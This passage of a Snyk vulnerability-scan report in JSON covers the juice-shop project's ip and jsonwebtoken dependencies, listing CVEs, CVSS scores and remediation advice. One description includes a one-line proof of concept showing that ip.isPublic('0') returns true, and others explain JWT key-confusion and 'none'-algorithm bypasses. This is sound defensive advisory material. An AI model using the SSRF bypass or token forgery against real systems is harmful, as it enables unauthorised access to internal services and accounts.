            "cvssVersion": "3.1",
            "modificationTime": "2025-09-16T16:37:35.338154Z"
          }
        ],
        "description": "## Overview\n[ip](https://github.com/indutny/node-ip) is a Node library.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF) via the `ip.isPublic()` and `ip.isPrivate()` functions. An attacker can interact with internal network resources by supplying specially crafted IP address such as null route (\"0\") that is being incorrectly identified as public. \r\n\r\n**Note:**\r\nThis issue exists because of an incomplete fix for CVE-2024-29415.\r\n\r\nExploit is only possible if the application and operating system interpret connection attempts to `0` or `0.0.0.0` as connections to `127.0.0.1`.\n## PoC\nTest null route bypass:\r\n\r\n`node -e \"const ip=require('ip'); console.log('0 bypass:', ip.isPublic('0'));\"` - returns `true`\n## Remediation\nThere is no fixed version for `ip`.\n## References\n- [GitHub Issue](https://github.com/indutny/node-ip/issues/160)\n- [Security Report](https://cosmosofcyberspace.github.io/CVE-Application-Document.html)\n",
        "epssDetails": {
          "percentile": "0.02394",
          "probability": "0.00016",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-59437"
          ],
          "CWE": [
            "CWE-918"
          ]
        },
        "packageName": "ip",
        "proprietary": false,
        "creationTime": "2025-09-16T16:34:42.744934Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-09-16T02:44:58Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-09-16T16:34:42.992033Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-09-16T16:37:35.338154Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "express-ipfilter@1.3.2",
          "ip@2.0.1"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "ip",
        "version": "2.0.1"
      },
      {
        "id": "SNYK-JS-IP-7148531",
        "title": "Server-Side Request Forgery (SSRF)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
        "credit": [
          "ouuan"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "ip",
        "references": [
          {
            "url": "https://github.com/indutny/node-ip/pull/144/commits/934fadee0080b9d201df95a3f7eead6c46e94017",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/node-ip/pull/144/commits/94f82bd4f2bace0c228bbbfe70073a71536fcbdf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/node-ip/pull/144/commits/aeea96e445164c72607a9043e37bcc7bc8786ec9",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/node-ip/issues/150",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/node-ip/pull/143",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/indutny/node-ip/pull/144",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-06-03T15:17:37.353649Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-06-06T12:41:40.856637Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "Red Hat",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-06-03T15:17:37.353649Z"
          }
        ],
        "description": "## Overview\n[ip](https://github.com/indutny/node-ip) is a Node library.\n\nAffected versions of this package are vulnerable to Server-Side Request Forgery (SSRF) via the `isPublic` function, which identifies some private IP addresses as public addresses due to improper parsing of the input.\r\nAn attacker can manipulate a system that uses `isLoopback()`, `isPrivate()` and `isPublic` functions to guard outgoing network requests to treat certain IP addresses as globally routable by supplying specially crafted IP addresses.\r\n\r\n**Note**\r\n\r\nThis vulnerability derived from an incomplete fix for [CVE-2023-42282](https://security.snyk.io/vuln/SNYK-JS-IP-6240864)\n## Remediation\nThere is no fixed version for `ip`.\n## References\n- [GitHub Commit](https://github.com/indutny/node-ip/pull/144/commits/934fadee0080b9d201df95a3f7eead6c46e94017)\n- [GitHub Commit](https://github.com/indutny/node-ip/pull/144/commits/94f82bd4f2bace0c228bbbfe70073a71536fcbdf)\n- [GitHub Commit](https://github.com/indutny/node-ip/pull/144/commits/aeea96e445164c72607a9043e37bcc7bc8786ec9)\n- [GitHub Issue](https://github.com/indutny/node-ip/issues/150)\n- [GitHub PR](https://github.com/indutny/node-ip/pull/143)\n- [GitHub PR](https://github.com/indutny/node-ip/pull/144)\n",
        "epssDetails": {
          "percentile": "0.85901",
          "probability": "0.02922",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-29415"
          ],
          "CWE": [
            "CWE-918"
          ]
        },
        "packageName": "ip",
        "proprietary": false,
        "creationTime": "2024-05-28T07:31:24.271080Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-05-27T20:40:21Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-05-28T08:06:24.160153Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-06-06T12:41:40.856637Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "express-ipfilter@1.3.2",
          "ip@2.0.1"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "ip",
        "version": "2.0.1"
      },
      {
        "id": "SNYK-JS-JSONWEBTOKEN-3180022",
        "title": "Improper Authentication",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<9.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "9.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.4,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L",
            "cvssV3BaseScore": 7.6,
            "modificationTime": "2024-03-11T09:52:56.598442Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.4,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:57:44.867775Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:56.598442Z"
          }
        ],
        "description": "## Overview\n[jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) is a JSON Web Token implementation (symmetric and asymmetric)\n\nAffected versions of this package are vulnerable to Improper Authentication such that the lack of algorithm definition in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification. \r\n\r\n## Exploitability\r\nUsers are affected only if all of the following conditions are true for the `jwt.verify()` function:\r\n\r\n1) A token with no signature is received.\r\n\r\n2) No algorithms are specified.\r\n\r\n3) A falsy (e.g., `null`, `false`, `undefined`) secret or key is passed.\n## Remediation\nUpgrade `jsonwebtoken` to version 9.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3)\n- [GitHub Release](https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0)\n",
        "epssDetails": {
          "percentile": "0.02667",
          "probability": "0.00016",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23540"
          ],
          "CWE": [
            "CWE-287"
          ],
          "GHSA": [
            "GHSA-qwph-4952-7xr6"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2022-12-22T09:09:36.072853Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-12-22T03:32:59Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-12-22T09:13:25.290846Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:56.598442Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0"
        ],
        "upgradePath": [
          false,
          "express-jwt@7.7.8",
          "jsonwebtoken@9.0.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "0.1.0"
      },
      {
        "id": "SNYK-JS-JSONWEBTOKEN-3180024",
        "title": "Improper Restriction of Security Token Assignment",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<9.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "9.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 6.3,
            "modificationTime": "2024-03-11T09:52:54.050914Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:07:27.676121Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:54.050914Z"
          }
        ],
        "description": "## Overview\n[jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) is a JSON Web Token implementation (symmetric and asymmetric)\n\nAffected versions of this package are vulnerable to Improper Restriction of Security Token Assignment via the `secretOrPublicKey ` argument due to misconfigurations of the key retrieval function `jwt.verify()`. Exploiting this vulnerability might result in incorrect verification of forged tokens when tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm.\r\n\r\n**Note:**\r\nThis vulnerability affects your application if it supports the usage of both symmetric and asymmetric keys in `jwt.verify()` implementation with the same key retrieval function.\n## Remediation\nUpgrade `jsonwebtoken` to version 9.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3)\n- [GitHub Release](https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0)\n",
        "epssDetails": {
          "percentile": "0.14972",
          "probability": "0.00049",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23541"
          ],
          "CWE": [
            "CWE-1259"
          ],
          "GHSA": [
            "GHSA-hjrf-2m68-5959"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2022-12-22T09:14:27.155728Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-12-22T03:33:19Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-12-22T09:16:03.621406Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:54.050914Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0"
        ],
        "upgradePath": [
          false,
          "express-jwt@7.7.8",
          "jsonwebtoken@9.0.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "0.1.0"
      },
      {
        "id": "SNYK-JS-JSONWEBTOKEN-3180026",
        "title": "Use of a Broken or Risky Cryptographic Algorithm",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<9.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "9.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.8,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "cvssV3BaseScore": 8.1,
            "modificationTime": "2024-03-11T09:52:54.264450Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:07:27.935665Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:54.264450Z"
          }
        ],
        "description": "## Overview\n[jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) is a JSON Web Token implementation (symmetric and asymmetric)\n\nAffected versions of this package are vulnerable to Use of a Broken or Risky Cryptographic Algorithm such that the library can be misconfigured to use legacy, insecure key types for signature verification. For example, DSA keys could be used with the RS256 algorithm. \r\n\r\n## Exploitability\r\n\r\nUsers are affected when using an algorithm and a key type _other_ than the combinations mentioned below:\r\n\r\nEC: ES256, ES384, ES512\r\n                  \r\nRSA: RS256, RS384, RS512, PS256, PS384, PS512 \r\n\r\nRSA-PSS: PS256, PS384, PS512                      \r\n\r\nAnd for Elliptic Curve algorithms:\r\n\r\nES256: prime256v1\r\n\r\nES384: secp384r1\r\n\r\nES512:  secp521r1 \r\n\r\n## Workaround \r\n\r\nUsers who are unable to upgrade to the fixed version can use the  `allowInvalidAsymmetricKeyTypes` option  to `true` in the `sign()` and `verify()` functions to continue usage of invalid key type/algorithm combination in 9.0.0 for legacy compatibility.\n## Remediation\nUpgrade `jsonwebtoken` to version 9.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3)\n- [GitHub Release](https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0)\n",
        "epssDetails": {
          "percentile": "0.18569",
          "probability": "0.00058",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23539"
          ],
          "CWE": [
            "CWE-327"
          ],
          "GHSA": [
            "GHSA-8cf7-32gw-wr33"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2022-12-22T09:19:03.430735Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-12-22T03:32:22Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-12-22T10:32:50.173080Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:54.264450Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0"
        ],
        "upgradePath": [
          false,
          "express-jwt@7.7.8",
          "jsonwebtoken@9.0.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "0.1.0"
      },
      {
        "id": "npm:jsonwebtoken:20150331",
        "title": "Authentication Bypass",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P",
        "credit": [
          "Tim McLean"
        ],
        "semver": {
          "vulnerable": [
            "<4.2.2"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.2.2"
        ],
        "patches": [
          {
            "id": "patch:npm:jsonwebtoken:20150331:0",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/jsonwebtoken/20150331/jsonwebtoken_20150331_0_0_1bb584bc382295eeb7ee8c4452a673a77a68b687_snyk.patch"
            ],
            "version": "=4.0.0 || =4.1.0 || =4.2.1",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.753281Z"
          }
        ],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/",
            "title": "Auth0 Blog"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/1bb584bc382295eeb7ee8c4452a673a77a68b687",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/WinDyAlphA/CVE-2015-9235_JWT_key_confusion",
            "title": "PoC"
          },
          {
            "url": "https://www.timmclean.net/2015/02/25/jwt-alg-none.html",
            "title": "Tim McLean Blog"
          },
          {
            "url": "https://github.com/z-bool/Venom-JWT",
            "title": "PoC in GitHub"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-03-11T09:46:39.424974Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 7.3,
            "modificationTime": "2025-04-28T20:49:16.487663Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:19.867949Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.0",
            "modificationTime": "2024-03-11T09:46:39.424974Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 7.3,
            "cvssVersion": "3.0",
            "modificationTime": "2025-04-28T20:49:16.487663Z"
          }
        ],
        "description": "## Overview\r\n[`jsonwebtoken`](https://www.npmjs.com/package/jsonwebtoken) is a JSON Web token implementation for symmetric and asymmetric keys.\r\nAffected versions of this package are vulnerable to an Authentication Bypass attack, due to the \"algorithm\" not being enforced. Attackers are given the opportunity to choose the algorithm sent to the server and generate signatures with arbitrary contents. The server expects an asymmetric key (RSA) but is sent a symmetric key (HMAC-SHA) with RSA's public key, so instead of going through a key validation process, the server will think the public key is actually an HMAC private key.\r\n\r\n## Remediation\r\nUpgrade `jsonwebtoken` to version 4.2.2 or greater.\r\n\r\n## References\r\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/1bb584bc382295eeb7ee8c4452a673a77a68b687)\r\n- [Tim McLean Blog](https://www.timmclean.net/2015/02/25/jwt-alg-none.html)\r\n- [Auth0 Blog](https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/)",
        "epssDetails": {
          "percentile": "0.97300",
          "probability": "0.41149",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2015-9235"
          ],
          "CWE": [
            "CWE-592"
          ],
          "NSP": [
            "17"
          ],
          "GHSA": [
            "GHSA-c7hr-j4mj-j2w6"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-JSONWEBTOKEN-10037",
            "npm:jsonwebtoken:20150331"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2015-03-31T16:00:00Z",
        "functions_new": [],
        "alternativeIds": [
          "SNYK-JS-JSONWEBTOKEN-10037"
        ],
        "disclosureTime": "2015-03-31T16:00:00Z",
        "exploitDetails": {
          "sources": [
            "PoC in GitHub",
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2015-03-31T16:00:00Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-19T12:46:36.363452Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0"
        ],
        "upgradePath": [
          false,
          "express-jwt@3.0.0",
          "jsonwebtoken@5.7.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "0.1.0"
      },
      {
        "id": "SNYK-JS-JSONWEBTOKEN-3180022",
        "title": "Improper Authentication",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<9.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "9.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.4,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L",
            "cvssV3BaseScore": 7.6,
            "modificationTime": "2024-03-11T09:52:56.598442Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.4,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:57:44.867775Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:56.598442Z"
          }
        ],
        "description": "## Overview\n[jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) is a JSON Web Token implementation (symmetric and asymmetric)\n\nAffected versions of this package are vulnerable to Improper Authentication such that the lack of algorithm definition in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification. \r\n\r\n## Exploitability\r\nUsers are affected only if all of the following conditions are true for the `jwt.verify()` function:\r\n\r\n1) A token with no signature is received.\r\n\r\n2) No algorithms are specified.\r\n\r\n3) A falsy (e.g., `null`, `false`, `undefined`) secret or key is passed.\n## Remediation\nUpgrade `jsonwebtoken` to version 9.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3)\n- [GitHub Release](https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0)\n",
        "epssDetails": {
          "percentile": "0.02667",
          "probability": "0.00016",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23540"
          ],
          "CWE": [
            "CWE-287"
          ],
          "GHSA": [
            "GHSA-qwph-4952-7xr6"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2022-12-22T09:09:36.072853Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-12-22T03:32:59Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-12-22T09:13:25.290846Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:56.598442Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "jsonwebtoken@0.4.0"
        ],
        "upgradePath": [
          false,
          "jsonwebtoken@9.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "0.4.0"
      },
      {
        "id": "SNYK-JS-JSONWEBTOKEN-3180024",
        "title": "Improper Restriction of Security Token Assignment",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<9.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "9.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 6.3,
            "modificationTime": "2024-03-11T09:52:54.050914Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:07:27.676121Z"
          },
          {
            "type": "secondary",
